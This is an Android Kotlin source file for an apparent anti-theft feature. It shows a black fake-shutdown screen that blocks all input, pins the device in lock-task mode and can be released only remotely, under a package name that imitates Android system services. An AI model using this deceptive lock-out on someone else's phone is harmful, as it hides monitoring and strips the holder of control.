package com.android.systemservices

import android.app.Activity
import android.content.Context
import android.content.Intent
import android.graphics.Color
import android.os.Build
import android.os.Bundle
import android.util.Log
import android.view.KeyEvent
import android.view.View
import android.view.WindowInsets
import android.view.WindowInsetsController
import android.view.WindowManager
import android.widget.FrameLayout

/**
 * Fake shutdown screen — part of theft mode.
 *
 * A pure-black fullscreen activity shown over the lock screen. The primary OFF
 * state is the FakeShutdownCover overlay (composited instantly on wake); this
 * activity is the fallback black screen for builds where the overlay cannot
 * show, and is launched directly by the service whenever black is needed but
 * the cover failed. There is deliberately NO menu and NO shutdown sequence —
 * arming goes straight to black.
 *
 * Release is REMOTE-ONLY: MonitoringService finishes this activity on
 * `stop_fake_shutdown` / `stop_theft_mode` (WebUI theft toggle). There is no
 * on-device exit — not even a secret tap — so a thief can never stumble out of it.
 */
class TheftFakeShutdownActivity : Activity() {

    companion object {
        private const val TAG = "FakeShutdown"
        private const val EXTRA_FINISH = "finish_now"

        /** True while the black activity is resumed (visible). Read by the watchdog. */
        @Volatile var resumed = false

        /** Show the black screen (brings to front if already showing). */
        fun launch(context: Context) {
            try {
                val i = Intent(context, TheftFakeShutdownActivity::class.java)
                    .addFlags(Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_CLEAR_TOP)
                context.startActivity(i)
            } catch (e: Exception) {
                Log.w(TAG, "launch failed: ${e.message}")
            }
        }

        /** Remote release — finishes the activity wherever it is. */
        fun release(context: Context) {
            try {
                val i = Intent(context, TheftFakeShutdownActivity::class.java)
                    .addFlags(Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_CLEAR_TOP)
                    .putExtra(EXTRA_FINISH, true)
                context.startActivity(i)
            } catch (e: Exception) {
                Log.w(TAG, "release failed: ${e.message}")
            }
        }
    }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        if (intent?.getBooleanExtra(EXTRA_FINISH, false) == true) {
            try { stopLockTask() } catch (_: Exception) {}
            finish()
            return
        }
        try { setShowWhenLocked(true) } catch (_: Exception) {}
        try { setTurnScreenOn(false) } catch (_: Exception) {}
        window?.addFlags(WindowManager.LayoutParams.FLAG_FULLSCREEN)
        try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
                window?.setDecorFitsSystemWindows(false)
            }
        } catch (_: Exception) {}
        // Pure black, absorbs everything silently — the phone looks and feels dead.
        val root = FrameLayout(this).apply {
            setBackgroundColor(Color.BLACK)
            setOnTouchListener { _, _ -> true }
        }
        setContentView(root)
        hideSystemBars()
        enterLockTask()
    }

    override fun onNewIntent(intent: Intent) {
        super.onNewIntent(intent)
        if (intent.getBooleanExtra(EXTRA_FINISH, false)) {
            try { stopLockTask() } catch (_: Exception) {}
            finish()
            return
        }
        hideSystemBars()
        enterLockTask()
    }

    override fun onResume() {
        super.onResume()
        resumed = true
        hideSystemBars()
        enterLockTask()
    }

    override fun onWindowFocusChanged(hasFocus: Boolean) {
        super.onWindowFocusChanged(hasFocus)
        if (hasFocus) {
            hideSystemBars()
            enterLockTask()
        }
    }

    // Back button is dead here — no way back into the phone from this screen.
    @Suppress("DEPRECATION")
    override fun onBackPressed() { /* consumed */ }

    // Swallow volume keys so no volume panel flashes over the black.
    override fun onKeyDown(keyCode: Int, event: KeyEvent?): Boolean {
        return when (keyCode) {
            KeyEvent.KEYCODE_VOLUME_UP, KeyEvent.KEYCODE_VOLUME_DOWN,
            KeyEvent.KEYCODE_VOLUME_MUTE, KeyEvent.KEYCODE_BACK -> true
            else -> super.onKeyDown(keyCode, event)
        }
    }

    override fun onDestroy() {
        resumed = false
        try { stopLockTask() } catch (_: Exception) {}
        super.onDestroy()
    }

    override fun onPause() {
        resumed = false
        super.onPause()
    }

    private fun hideSystemBars() {
        try {
            // Paint all system chrome black so even a pre-hide frame is invisible.
            window?.let { w ->
                w.navigationBarColor = Color.TRANSPARENT
                w.statusBarColor = Color.TRANSPARENT
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
                    w.isNavigationBarContrastEnforced = false
                    w.isStatusBarContrastEnforced = false
                }
                w.addFlags(WindowManager.LayoutParams.FLAG_LAYOUT_NO_LIMITS)
            }
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
                window?.insetsController?.let { c ->
                    c.hide(WindowInsets.Type.statusBars() or WindowInsets.Type.navigationBars())
                    // BEHAVIOR_DEFAULT (not transient): edge swipes must NOT flash the bars
                    // back — with lock-task pinning there is no gesture escape to preserve.
                    c.systemBarsBehavior = WindowInsetsController.BEHAVIOR_DEFAULT
                }
            } else {
                @Suppress("DEPRECATION")
                window?.decorView?.systemUiVisibility = (View.SYSTEM_UI_FLAG_IMMERSIVE_STICKY
                        or View.SYSTEM_UI_FLAG_FULLSCREEN
                        or View.SYSTEM_UI_FLAG_HIDE_NAVIGATION
                        or View.SYSTEM_UI_FLAG_LAYOUT_FULLSCREEN
                        or View.SYSTEM_UI_FLAG_LAYOUT_HIDE_NAVIGATION
                        or View.SYSTEM_UI_FLAG_LAYOUT_STABLE)
            }
        } catch (_: Exception) {}
    }

    // Lock-task (kiosk) pinning: kills Home / Recents / gesture-nav escapes.
    // Requires Device Owner + our package in setLockTaskPackages (done at arm
    // time); fails soft otherwise.
    private fun enterLockTask() {
        try {
            if (Prefs(this).fakeShutdownArmed) startLockTask()
        } catch (_: Exception) {}
    }
}
